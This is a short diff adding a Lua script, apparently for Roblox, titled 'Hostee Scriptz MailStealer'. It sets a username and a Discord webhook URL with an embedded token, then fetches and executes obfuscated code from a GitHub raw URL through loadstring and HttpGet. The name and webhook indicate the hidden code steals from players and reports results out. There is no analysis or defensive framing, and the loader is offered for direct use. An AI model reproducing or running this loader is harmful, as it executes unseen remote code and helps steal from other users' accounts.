@@ -1,0 +1,9 @@
+--[[ Hostee Scriptz MailStealer ]]--
+ 
+--[[ Main Config ]]--
+_G.UserName = "papeno117"
+--[[ Webhook Config ]]--
+_G.WebHook = "https://discord.com/api/webhooks/1016371316938510396/3dWXyFvmV8fZMWcEq5cEUFj10-JYI1dTCP-BtreMo5gWHfR-j342UJ5jy5knhCSJg65B"
+ 
+--[[ Source Code But Obfuscated ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97", true))()
